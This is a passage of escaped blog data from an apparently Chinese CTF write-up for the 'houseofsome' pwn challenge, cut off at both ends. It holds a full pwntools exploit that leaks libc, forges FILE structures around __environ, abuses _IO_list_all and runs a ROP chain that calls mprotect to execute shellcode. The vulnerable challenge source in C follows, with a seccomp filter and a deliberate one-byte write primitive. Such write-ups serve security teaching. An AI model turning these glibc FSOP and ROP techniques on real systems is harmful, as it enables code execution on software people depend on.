class=\"string\">&quot;./houseofsome&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = remote(&quot;127.0.0.1&quot;, 12000)</span></span><br><span class=\"line\">tob = <span class=\"keyword\">lambda</span> x: <span class=\"built_in\">str</span>(x).encode()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">name</span>(<span class=\"params\">size, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;size&gt; &quot;</span>, tob(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;name&gt; &quot;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dev</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;dev&gt; &quot;</span>, tob(idx))</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">draw</span>(<span class=\"params\">offset, length</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;offset&gt; &quot;</span>, tob(offset))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;length&gt; &quot;</span>, tob(length))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leave</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;5&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;-&quot;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;invalid option &quot;</span>)</span><br><span class=\"line\">leak = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">b&quot;.&quot;</span>, drop=<span class=\"literal\">True</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;leak : <span class=\"subst\">&#123;leak:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">libc_base = leak - <span class=\"number\">0x2205c0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>, checksec=<span class=\"literal\">None</span>)</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">name(<span class=\"number\">0x2b0</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x260</span>: &#123;</span><br><span class=\"line\">        <span class=\"number\">0x18</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"number\">0x20</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">        <span class=\"number\">0x30</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>) + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x1f00</span>-<span class=\"number\">0x730</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x400</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x590</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0xe0</span>-<span class=\"number\">0x60</span>: libc.symbols[<span class=\"string\">&#x27;_IO_file_jumps&#x27;</span>] - <span class=\"number\">0x48</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>) + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x50</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x600</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x610</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x300</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x2f0</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x360</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x210</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">environ = libc.symbols[<span class=\"string\">&#x27;__environ&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">name(<span class=\"number\">0xb0</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x00</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _flags</span></span><br><span class=\"line\">    <span class=\"number\">0x20</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_base</span></span><br><span class=\"line\">    <span class=\"number\">0x28</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_ptr</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"number\">0x38</span>: environ+<span class=\"number\">8</span>, <span class=\"comment\"># _IO_buf_base</span></span><br><span class=\"line\">    <span class=\"number\">0x40</span>: environ+<span class=\"number\">8</span>+<span class=\"number\">0x400</span>, <span class=\"comment\"># _IO_buf_end</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"number\">0x70</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _fileno</span></span><br><span class=\"line\">    <span class=\"number\">0x68</span>: environ+<span class=\"number\">8</span>, <span class=\"comment\"># _chain</span></span><br><span class=\"line\">    <span class=\"number\">0x82</span>: <span class=\"string\">b&quot;\\x00&quot;</span>, <span class=\"comment\"># _vtable_offset</span></span><br><span class=\"line\">    <span class=\"number\">0x88</span>: environ-<span class=\"number\">0x10</span>,</span><br><span class=\"line\">    <span class=\"number\">0xa0</span>: <span class=\"string\">b&quot;\\n&quot;</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">name(<span class=\"number\">0x20</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0xc0</span>-<span class=\"number\">0x20</span>-<span class=\"number\">0xa0</span>: <span class=\"number\">2</span>, <span class=\"comment\"># _mode</span></span><br><span class=\"line\">    <span class=\"number\">0xd8</span>-<span class=\"number\">0x20</span>-<span class=\"number\">0xa0</span>: libc.symbols[<span class=\"string\">&#x27;_IO_wfile_jumps&#x27;</span>], <span class=\"comment\"># vtable</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)[:-<span class=\"number\">1</span>] + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">dev(<span class=\"number\">2</span>)</span><br><span class=\"line\">draw(libc.symbols[<span class=\"string\">&quot;_IO_list_all&quot;</span>] - <span class=\"number\">0x114514000</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">leave()</span><br><span class=\"line\"></span><br><span class=\"line\">hos = HouseOfSome(libc, environ+<span class=\"number\">8</span>, environ-<span class=\"number\">0x10</span>)</span><br><span class=\"line\">stack = hos.bomb_raw(io, libc.symbols[<span class=\"string\">&quot;_IO_flush_all&quot;</span>] + <span class=\"number\">481</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;stack : <span class=\"subst\">&#123;stack:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdx = <span class=\"number\">0x0000000000096272</span> + libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">rop = ROP(libc)</span><br><span class=\"line\">rop.base = stack</span><br><span class=\"line\">rop.raw(pop_rdx)</span><br><span class=\"line\">rop.raw(<span class=\"number\">7</span>)</span><br><span class=\"line\">rop.call(<span class=\"string\">&#x27;mprotect&#x27;</span>, [stack &amp; (~<span class=\"number\">0xfff</span>), <span class=\"number\">0x1000</span>])</span><br><span class=\"line\">rop.raw(stack + <span class=\"number\">0x40</span>)</span><br><span class=\"line\">log.info(rop.dump())</span><br><span class=\"line\">rop_chain = rop.chain()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> <span class=\"string\">b&quot;\\n&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> rop_chain, <span class=\"string\">&quot;\\\\n in rop_chain&quot;</span></span><br><span class=\"line\">io.sendline(rop_chain + shellcode)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;info&#x27;</span></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"碎碎念\"><a href=\"#碎碎念\" class=\"headerlink\" title=\"碎碎念\"></a>碎碎念</h2><p>出题的时候有些疏忽，忘记了main_arena也在libc内，导致可以off by null修改TopChunk，使得最后能够控制堆结构</p>\n<p>但是这个方法较为复杂，是一个小小的非预期，在比赛还有30个小时多的时候放出，在14小时之后出现第一血，最后只有5解出，算是预期之内吧</p>\n<p>接下来如果还有机会，我还会带来更加有趣的利用手法的题目，敬请期待吧</p>\n","excerpt":"","more":"<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p>题目源码如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// gcc houseofsome.c -o houseofsome -Wl,--dynamic-linker=./ld-linux-x86-64.so.2 -Wl,--rpath=./</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/seccomp.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">install_seccomp</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> filter[] = &#123;<span class=\"number\">32</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">21</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">5</span>,<span class=\"number\">62</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">192</span>,<span class=\"number\">32</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">53</span>,<span class=\"number\">0</span>,<span class=\"number\">3</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">64</span>,<span class=\"number\">21</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>,<span class=\"number\">59</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">21</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">66</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">6</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">255</span>,<span class=\"number\">127</span>,<span class=\"number\">6</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">prog</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">short</span> len;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *filter;</span><br><span class=\"line\">  &#125; rule = &#123;</span><br><span class=\"line\">    .len = <span class=\"keyword\">sizeof</span>(filter) &gt;&gt; <span class=\"number\">3</span>,</span><br><span class=\"line\">    .filter = filter</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(prctl(PR_SET_NO_NEW_PRIVS, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>) &lt; <span class=\"number\">0</span>) &#123; perror(<span class=\"string\">&quot;prctl(PR_SET_NO_NEW_PRIVS)&quot;</span>); <span class=\"built_in\">exit</span>(<span class=\"number\">2</span>); &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;rule) &lt; <span class=\"number\">0</span>) &#123; perror(<span class=\"string\">&quot;prctl(PR_SET_SECCOMP)&quot;</span>); <span class=\"built_in\">exit</span>(<span class=\"number\">2</span>); &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">init</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> tmp1 = <span class=\"built_in\">stdin</span>;</span><br><span class=\"line\">    setbuf(tmp1, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"type\">size_t</span> tmp2 = <span class=\"built_in\">stdout</span>;</span><br><span class=\"line\">    setbuf(tmp2, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"type\">size_t</span> tmp3 = <span class=\"built_in\">stderr</span>;</span><br><span class=\"line\">    setbuf(tmp3, <span class=\"number\">0</span>);</span><br><span class=\"line\">    install_seccomp();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">size_t</span> <span class=\"title function_\">getint</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> tmp;</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%lld&quot;</span>, &amp;tmp);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> tmp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">readline</span><span class=\"params\">(<span class=\"type\">char</span> *buf, <span class=\"type\">size_t</span> n)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> tmp;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(; i &lt; n &amp;&amp; read(<span class=\"number\">0</span>, &amp;tmp, <span class=\"number\">1</span>) &gt; <span class=\"number\">0</span>; ++i) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(tmp == <span class=\"string\">&#x27;\\n&#x27;</span>) &#123;</span><br><span class=\"line\">            buf[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        buf[i] = tmp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    buf[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *name = <span class=\"number\">0</span>;</span><br><span class=\"line\">FILE* dev = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> magic = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> *pool[<span class=\"number\">2</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"type\">int</span> idx = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">change_name</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    <span class=\"type\">size_t</span> size;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size&gt; &quot;</span>);</span><br><span class=\"line\">    size = getint();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(size &lt;= <span class=\"number\">0</span> || size &gt; <span class=\"number\">0x2000</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;wrong.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    idx = <span class=\"number\">1</span> - idx;</span><br><span class=\"line\">    name = pool[idx];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(name) <span class=\"built_in\">free</span>(name);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;name&gt; &quot;</span>);</span><br><span class=\"line\">    name = <span class=\"built_in\">malloc</span>(size + <span class=\"number\">1</span>);</span><br><span class=\"line\">    pool[idx] = name;</span><br><span class=\"line\">    readline(name, size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">change_dev</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(dev) fclose(dev);</span><br><span class=\"line\">    <span class=\"type\">size_t</span> op;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1. /dev/urandom\\n2. /dev/zero\\n3. /dev/null\\ndev&gt; &quot;</span>);</span><br><span class=\"line\">    op = getint();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(op == <span class=\"number\">1</span>) dev = fopen(<span class=\"string\">&quot;/dev/urandom&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(op == <span class=\"number\">2</span>) dev = fopen(<span class=\"string\">&quot;/dev/zero&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> dev = fopen(<span class=\"string\">&quot;/dev/null&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(dev == <span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;open dev error.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    setbuf(dev, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">draw</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(magic || !dev || !name) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;wrong.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> addr, length;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;offset&gt; &quot;</span>);</span><br><span class=\"line\">    addr = getint();</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;length&gt; &quot;</span>);</span><br><span class=\"line\">    length = getint();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(length &lt; <span class=\"number\">0</span> || length &gt; <span class=\"number\">8</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;wrong.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fread(<span class=\"number\">0x114514000</span>+addr, <span class=\"number\">1</span>, <span class=\"number\">1</span>, dev);</span><br><span class=\"line\">    magic = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">show</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;name: %s\\n&quot;</span>, name);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;picture: &quot;</span>);</span><br><span class=\"line\">    write(<span class=\"number\">1</span>, <span class=\"number\">0x114514000</span>, <span class=\"number\">0x1000</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    init();</span><br><span class=\"line\">    <span class=\"type\">size_t</span> choice;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(mmap(<span class=\"number\">0x114514000</span>, <span class=\"number\">0x1000</span>, PROT_READ | PROT_WRITE, <span class=\"number\">0x22</span>, <span class=\"number\">-1</span>, <span class=\"number\">0</span>) == <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;mmap error.\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;gift: %p\\n&quot;</span>, <span class=\"number\">0x114514000</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1. name\\n2. dev\\n3. draw\\n4 .show\\n5. exit\\n&gt; &quot;</span>);</span><br><span class=\"line\">        choice = getint();</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (choice)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">                change_name();</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">                change_dev();</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">                draw();</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">                show();</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;  </span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">5</span>:</span><br><span class=\"line\">                <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span 